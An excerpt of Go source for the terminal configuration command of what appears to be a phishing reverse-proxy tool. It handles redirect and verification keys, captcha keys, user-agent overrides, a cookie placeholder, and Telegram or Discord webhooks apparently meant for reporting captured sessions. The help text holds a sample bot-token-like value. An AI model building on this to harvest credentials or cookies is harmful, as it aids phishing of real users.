...
func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		keys := []string{"domain", "ip", "redirect_key", "verification_key", "verification_token", "redirect_url", "webhook_verbosity", "webhook_telegram", "webhook_discord", "turnstile_sitekey", "turnstile_privkey", "recaptcha_sitekey", "recaptcha_privkey", "useragent_override", "cookie_key"}
		vals := []string{t.cfg.baseDomain, t.cfg.serverIP, t.cfg.redirectParam, t.cfg.verificationParam, t.cfg.verificationToken, t.cfg.redirectUrl, strconv.Itoa(t.cfg.webhook_verbosity), t.cfg.webhook_telegram, t.cfg.webhook_discord,t.cfg.turnstile_sitekey, t.cfg.turnstile_privkey, t.cfg.recaptcha_sitekey, t.cfg.recaptcha_privkey, t.cfg.useragent_override, t.cfg.cookie_key}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		...
		case "useragent_override":
			t.cfg.SetUserAgentOverride(args[1])
			return nil
		case "cookie_key":
			t.cfg.SetCookieKey(args[1])
			return nil
		}
	}
...
func (t *Terminal) createHelp() {
	...
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		...
		readline.PcItem("webhook_verbosity"), readline.PcItem("webhook_telegram"), readline.PcItem("webhook_discord"),readline.PcItem("turnstile_sitekey"),readline.PcItem("turnstile_privkey"),readline.PcItem("recaptcha_sitekey"),readline.PcItem("recaptcha_privkey"), readline.PcItem("useragent_override"), readline.PcItem("cookie_key"),))
	...
	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "telegram webhook config in format: bot_token/chat_id (example: 6634327174:AAFkvU_d7yKkUBO21InD9zlFGsZmkU7T89A/6602382122)")
	h.AddSubCommand("config", []string{"webhook_discord"}, "webhook_discord <id>/<token>", "discord webhook token in format: id/token (example: 6634327174:AAFkvU_d7yKkUBO21InD9zlFGsZmkU7T89A/6602382122)")
	...
	h.AddSubCommand("config", []string{"useragent_override"}, "useragent_override", "set the user-agent value for all requests, leave empty to use real user-agent")
	h.AddSubCommand("config", []string{"cookie_key"}, "cookie_key", "set the {cookie_key} placeholder value")
